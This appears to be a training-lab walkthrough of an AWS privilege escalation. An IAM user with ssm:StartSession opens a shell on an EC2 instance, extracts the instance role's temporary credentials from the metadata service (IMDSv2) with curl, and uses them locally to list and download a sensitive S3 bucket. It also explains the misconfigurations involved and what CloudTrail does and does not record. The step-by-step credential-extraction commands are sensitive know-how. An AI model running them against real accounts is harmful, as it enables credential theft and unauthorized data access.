# Guided Walkthrough: One-Hop Privilege Escalation via ssm:StartSession to S3 Bucket

This scenario demonstrates a privilege escalation vulnerability where an IAM user has permission to start interactive shell sessions on EC2 instances via AWS Systems Manager (SSM) Session Manager. The attacker can establish an SSH-like interactive session to an EC2 instance that has an IAM role with S3 bucket access permissions, extract the temporary credentials from the EC2 Instance Metadata Service (IMDS), and then use those credentials locally to access sensitive S3 buckets.

This attack vector is particularly stealthy because SSM Session Manager provides shell access without requiring network connectivity, open SSH ports, or SSH keys. Unlike traditional SSH-based attacks, session access is often granted broadly across engineering teams for legitimate troubleshooting purposes, making this a realistic initial access vector. The technique provides SSH-like access via AWS API calls, bypassing traditional network security controls and leaving minimal forensic evidence if SSM Session Manager logging is not properly configured.

The extracted credentials are time-limited but fully functional AWS credentials (AccessKeyId, SecretAccessKey, and SessionToken) that can be used from any location to access sensitive data stores. The Instance Metadata Service (IMDS) at http://169.254.169.254 exposes these credentials to any process running on the EC2 instance, including an attacker with SSM session access.

## The Challenge

You start as `pl-prod-ssm-001-to-bucket-starting-user` — an IAM user whose credentials were provided via Terraform outputs. This user has `ssm:StartSession` permission but no direct access to the target S3 bucket (`pl-sensitive-data-ssm-001-to-bucket-{account_id}-{suffix}`).

Somewhere in the account there is an EC2 instance running the SSM agent. That instance has an IAM instance profile attached to it — `pl-prod-ssm-001-to-bucket-ec2-role` — which holds S3 read permissions on the target bucket. Your job is to bridge the gap: get from your IAM user to that S3 bucket by exploiting the SSM session access.

## Reconnaissance

First, confirm your identity and verify that you don't already have direct bucket access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::<account_id>:user/pl-prod-ssm-001-to-bucket-starting-user

aws s3 ls s3://pl-sensitive-data-ssm-001-to-bucket-<account_id>-<suffix>
# An error occurred (AccessDenied) when calling the ListObjectsV2 operation: ...
```

Good — no direct access. Now let's find our target. If you have `ssm:DescribeInstanceInformation` available via a readonly principal, you can identify which instances have the SSM agent online:

```bash
aws ssm describe-instance-information \
  --query 'InstanceInformationList[*].[InstanceId,ComputerName,IPAddress]' \
  --output table
```

Alternatively, `ec2:DescribeInstances` will show you each instance's attached IAM instance profile ARN — a quick way to spot which instance is carrying the S3 access role:

```bash
aws ec2 describe-instances \
  --query 'Reservations[].Instances[].[InstanceId,State.Name,IamInstanceProfile.Arn]' \
  --output table
```

Look for the instance with `pl-prod-ssm-001-to-bucket-instance-profile` in its profile ARN. That's your target.

## Exploitation

With the instance ID in hand, start an interactive SSM session using your starting user credentials:

```bash
aws ssm start-session --target <instance-id>
```

SSM drops you into a shell on the EC2 instance. No SSH keys required, no bastion host, no open ports — just an API call. From inside the session, the Instance Metadata Service is reachable at the link-local address `http://169.254.169.254`. This is where EC2 exposes temporary credentials for the attached instance role.

The instance has IMDSv2 configured, so you need a session token before you can fetch credentials:

```bash
# Step 1: Get an IMDSv2 session token (valid for 6 hours)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Discover the name of the attached IAM role
ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)

# Step 3: Retrieve the role's temporary credentials
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
```

The response is a JSON blob containing `AccessKeyId`, `SecretAccessKey`, `Token`, and `Expiration`. Copy the full JSON output — you'll need it in the next step.

Type `exit` to leave the SSM session and return to your local shell.

Back locally, export the extracted credentials as environment variables:

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
```

## Verification

Confirm that you're now operating as the EC2 instance role, not your original starting user:

```bash
aws sts get-caller-identity
# {
#   "UserId": "AROA...:i-xxxxxxxxx",
#   "Account": "<account_id>",
#   "Arn": "arn:aws:sts::<account_id>:assumed-role/pl-prod-ssm-001-to-bucket-ec2-role/i-xxxxxxxxx"
# }
```

Now access the target bucket:

```bash
aws s3 ls s3://pl-sensitive-data-ssm-001-to-bucket-<account_id>-<suffix>/
# 2024-01-01 00:00:00       1234 sensitive-data.txt

aws s3 cp s3://pl-sensitive-data-ssm-001-to-bucket-<account_id>-<suffix>/sensitive-data.txt .
# download: s3://pl-sensitive-data-ssm-001-to-bucket-<account_id>-<suffix>/sensitive-data.txt to ./sensitive-data.txt
```

You've successfully accessed the sensitive bucket.

## What Happened

You started with an IAM user that had no direct path to the S3 bucket. The vulnerability was a combination of two misconfigurations: the starting user had unrestricted `ssm:StartSession` permission (no resource conditions, no tag-based restrictions), and an EC2 instance in the account was running with an instance role that held S3 read access to a sensitive bucket.

By chaining these two things together — shell access via SSM, then credential extraction via IMDS — you effectively "borrowed" the EC2 instance's identity. The extracted credentials are fully valid AWS credentials that work from any IP address, not just from the EC2 instance itself. This is a one-hop escalation: a single jump from your starting user through the EC2 instance role to the target bucket.

In real environments this pattern appears frequently when engineering teams are granted broad SSM access for operational convenience, without considering that some EC2 instances carry sensitive IAM roles. The attack leaves a CloudTrail record of the `ssm:StartSession` call and the subsequent S3 API calls, but the IMDS credential extraction itself is entirely invisible to AWS — it happens inside the instance over a local network interface.
